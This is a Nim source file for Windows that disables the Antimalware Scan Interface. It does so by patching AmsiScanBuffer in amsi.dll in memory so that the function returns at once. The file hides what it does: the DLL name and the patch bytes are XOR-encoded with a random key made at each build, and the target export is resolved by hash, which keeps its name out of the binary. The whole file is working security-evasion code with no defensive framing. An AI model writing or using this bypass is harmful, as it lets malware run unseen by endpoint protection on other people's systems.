import winim/lean
import std/strutils

# Random XOR key generated at compile time via shell - different every build
const xorKey = static:
  let (o, rc) = gorgeEx("python3 -c 'import secrets; print(secrets.randbelow(254)+1)'")
  if rc == 0: uint8(o.strip().parseInt)
  else:
    # fallback: derive from compile timestamp so it still varies per build
    let t = CompileTime
    (uint8(ord(t[0])) xor uint8(ord(t[3])) xor uint8(ord(t[6]))) or 1'u8

proc encodeBytes(s: static string): seq[uint8] {.compileTime.} =
  result = newSeq[uint8](s.len)
  for i, c in s:
    result[i] = uint8(ord(c)) xor xorKey

# "amsi.dll" stored XOR'd - never plaintext in the binary
const encDll = encodeBytes("amsi.dll")

# Patch bytes: xor eax, eax (0x31 0xC0) ; ret (0xC3)
# Stored XOR'd - different raw bytes every build
const encPatch = [
  uint8(0x31) xor xorKey,
  uint8(0xC0) xor xorKey,
  uint8(0xC3) xor xorKey,
]

proc decodeStr(enc: openArray[uint8]): string =
  result = newString(enc.len)
  for i, b in enc:
    result[i] = char(b xor xorKey)

# FNV-1a constants
const
  fnvBasis = 0xcbf29ce484222325'u64
  fnvPrime = 0x100000000001b3'u64

# Hash of "AmsiScanBuffer" computed at compile time - string never in binary
const scanHash = static:
  var h = fnvBasis
  for c in "AmsiScanBuffer":
    h = (h xor uint64(ord(c))) * fnvPrime
  h

proc hashExport(p: ptr UncheckedArray[uint8]): uint64 =
  result = fnvBasis
  var i = 0
  while p[i] != 0:
    result = (result xor uint64(p[i])) * fnvPrime
    inc i

proc findByHash(base: uint, target: uint64): pointer =
  let dos    = cast[ptr IMAGE_DOS_HEADER](base)
  let nt     = cast[ptr IMAGE_NT_HEADERS64](base + uint(dos.e_lfanew))
  let expRva = uint(nt.OptionalHeader.DataDirectory[0].VirtualAddress)
  if expRva == 0: return nil

  let exp   = cast[ptr IMAGE_EXPORT_DIRECTORY](base + expRva)
  let names = cast[ptr UncheckedArray[DWORD]](base + uint(exp.AddressOfNames))
  let ords  = cast[ptr UncheckedArray[WORD]](base + uint(exp.AddressOfNameOrdinals))
  let fns   = cast[ptr UncheckedArray[DWORD]](base + uint(exp.AddressOfFunctions))

  for i in 0 ..< int(exp.NumberOfNames):
    let namePtr = cast[ptr UncheckedArray[uint8]](base + uint(names[i]))
    if hashExport(namePtr) == target:
      return cast[pointer](base + uint(fns[ords[i]]))
  return nil

proc patchAmsi*() =
  let dllName = decodeStr(encDll)
  let hAmsi   = cast[uint](LoadLibraryA(dllName))
  if hAmsi == 0: return

  let fn = findByHash(hAmsi, scanHash)
  if fn == nil: return

  var old: DWORD = 0
  discard VirtualProtect(fn, 3, PAGE_EXECUTE_READWRITE, addr old)

  let p = cast[ptr UncheckedArray[uint8]](fn)
  p[0] = encPatch[0] xor xorKey
  p[1] = encPatch[1] xor xorKey
  p[2] = encPatch[2] xor xorKey

  discard VirtualProtect(fn, 3, old, addr old)
